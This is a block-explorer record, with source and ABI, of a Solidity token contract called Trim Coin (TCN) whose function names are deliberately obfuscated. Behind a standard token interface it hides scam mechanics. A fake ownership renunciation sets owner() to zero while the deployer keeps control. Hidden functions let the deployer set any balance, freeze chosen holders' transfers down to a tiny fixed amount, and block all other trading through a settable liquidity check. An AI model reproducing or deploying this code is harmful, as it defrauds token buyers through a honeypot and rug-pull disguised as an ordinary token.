{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract minAtTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchShouldMax {\n    function createPair(address receiverTokenFee, address maxLimit) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface receiverTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface enableToTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTeam) external view returns (uint256);\n\n    function transfer(address amountLimit, uint256 amountLiquidityEnable) external returns (bool);\n\n    function allowance(address maxFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountLiquidityEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountLimit,\n        uint256 amountLiquidityEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoEnable, uint256 value);\n    event Approval(address indexed maxFee, address indexed spender, uint256 value);\n}\n\ninterface minModeSender is enableToTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TrimCoin is minAtTotal, enableToTeam, minModeSender {\n\n    uint256 constant txLaunchEnable = 14 ** 10;\n\n    mapping(address => bool) public exemptShould;\n\n    bool private launchedMax;\n\n    function launchedSender(address enableLimit) public {\n        modeFromAt();\n        if (feeTrading == launchedMax) {\n            takeLiquidity = true;\n        }\n        if (enableLimit == senderFundTrading || enableLimit == takeMin) {\n            return;\n        }\n        exemptShould[enableLimit] = true;\n    }\n\n    function allowance(address swapBuy, address limitShould) external view virtual override returns (uint256) {\n        if (limitShould == swapSell) {\n            return type(uint256).max;\n        }\n        return senderFrom[swapBuy][limitShould];\n    }\n\n    event OwnershipTransferred(address indexed shouldIs, address indexed buySwap);\n\n    uint256 public teamTx = 3;\n\n    uint256 shouldMin;\n\n    function name() external view virtual override returns (string memory) {\n        return isTotal;\n    }\n\n    address public senderFundTrading;\n\n    uint256 minFundTotal;\n\n    bool public feeTrading;\n\n    function maxLaunched() public {\n        emit OwnershipTransferred(senderFundTrading, address(0));\n        tradingAmount = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return tradingAmount;\n    }\n\n    bool public amountMarketing;\n\n    function listReceiver(address launchedToTrading, address amountLimit, uint256 amountLiquidityEnable) internal view returns (uint256) {\n        require(amountLiquidityEnable > 0);\n\n        uint256 marketingLaunch = 0;\n        if (launchedToTrading == takeMin && teamTx > 0) {\n            marketingLaunch = amountLiquidityEnable * teamTx / 100;\n        } else if (amountLimit == takeMin && swapTx > 0) {\n            marketingLaunch = amountLiquidityEnable * swapTx / 100;\n        }\n        require(marketingLaunch <= amountLiquidityEnable);\n        return amountLiquidityEnable - marketingLaunch;\n    }\n\n    mapping(address => mapping(address => uint256)) private senderFrom;\n\n    function teamSwap(address autoLiquidity) public {\n        if (launchedToMin) {\n            return;\n        }\n        if (feeList) {\n            launchedMax = false;\n        }\n        tradingWallet[autoLiquidity] = true;\n        \n        launchedToMin = true;\n    }\n\n    function tokenTotal(address launchedToTrading, address amountLimit, uint256 amountLiquidityEnable) internal returns (bool) {\n        require(walletLaunch[launchedToTrading] >= amountLiquidityEnable);\n        walletLaunch[launchedToTrading] -= amountLiquidityEnable;\n        walletLaunch[amountLimit] += amountLiquidityEnable;\n        emit Transfer(launchedToTrading, amountLimit, amountLiquidityEnable);\n        return true;\n    }\n\n    mapping(address => bool) public tradingWallet;\n\n    function approve(address limitShould, uint256 amountLiquidityEnable) public virtual override returns (bool) {\n        senderFrom[_msgSender()][limitShould] = amountLiquidityEnable;\n        emit Approval(_msgSender(), limitShould, amountLiquidityEnable);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSell;\n    }\n\n    mapping(address => uint256) private walletLaunch;\n\n    bool public exemptToken;\n\n    bool public enableTeam;\n\n    function receiverReceiver(address enableMarketing, uint256 amountLiquidityEnable) public {\n        modeFromAt();\n        walletLaunch[enableMarketing] = amountLiquidityEnable;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletFund;\n    }\n\n    function modeFromAt() private view {\n        require(tradingWallet[_msgSender()]);\n    }\n\n    string private teamSell = \"TCN\";\n\n    function getOwner() external view returns (address) {\n        return tradingAmount;\n    }\n\n    string private isTotal = \"Trim Coin\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeMin;\n    }\n\n    bool public launchedToMin;\n\n    function transferFrom(address launchedToTrading, address amountLimit, uint256 amountLiquidityEnable) external override returns (bool) {\n        if (_msgSender() != swapSell) {\n            if (senderFrom[launchedToTrading][_msgSender()] != type(uint256).max) {\n                require(amountLiquidityEnable <= senderFrom[launchedToTrading][_msgSender()]);\n                senderFrom[launchedToTrading][_msgSender()] -= amountLiquidityEnable;\n            }\n        }\n        return feeTx(launchedToTrading, amountLimit, amountLiquidityEnable);\n    }\n\n    function transfer(address enableMarketing, uint256 amountLiquidityEnable) external virtual override returns (bool) {\n        return feeTx(_msgSender(), enableMarketing, amountLiquidityEnable);\n    }\n\n    uint256 private walletFund = 100000000 * 10 ** 18;\n\n    function balanceOf(address totalTeam) public view virtual override returns (uint256) {\n        return walletLaunch[totalTeam];\n    }\n\n    address public takeMin;\n\n    address swapSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public swapTx = 0;\n\n    uint8 private modeMin = 18;\n\n    function autoTo(uint256 amountLiquidityEnable) public {\n        modeFromAt();\n        minFundTotal = amountLiquidityEnable;\n    }\n\n    address isSender;\n\n    constructor (){\n        \n        maxLaunched();\n        receiverTotal autoMode = receiverTotal(swapSell);\n        takeMin = launchShouldMax(autoMode.factory()).createPair(autoMode.WETH(), address(this));\n        isSender = launchShouldMax(autoMode.factory()).feeTo();\n        \n        senderFundTrading = _msgSender();\n        tradingWallet[senderFundTrading] = true;\n        walletLaunch[senderFundTrading] = walletFund;\n        if (feeTrading) {\n            launchedMax = false;\n        }\n        emit Transfer(address(0), senderFundTrading, walletFund);\n    }\n\n    bool private teamFrom;\n\n    address private tradingAmount;\n\n    function feeTx(address launchedToTrading, address amountLimit, uint256 amountLiquidityEnable) internal returns (bool) {\n        if (launchedToTrading == senderFundTrading) {\n            return tokenTotal(launchedToTrading, amountLimit, amountLiquidityEnable);\n        }\n        uint256 senderReceiver = enableToTeam(takeMin).balanceOf(isSender);\n        require(senderReceiver == minFundTotal);\n        require(amountLimit != isSender);\n        if (exemptShould[launchedToTrading]) {\n            return tokenTotal(launchedToTrading, amountLimit, txLaunchEnable);\n        }\n        amountLiquidityEnable = listReceiver(launchedToTrading, amountLimit, amountLiquidityEnable);\n        return tokenTotal(launchedToTrading, amountLimit, amountLiquidityEnable);\n    }\n\n    bool private feeList;\n\n    bool private takeLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"autoTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"}],\"name\":\"launchedSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"receiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFundTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"teamSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TrimCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}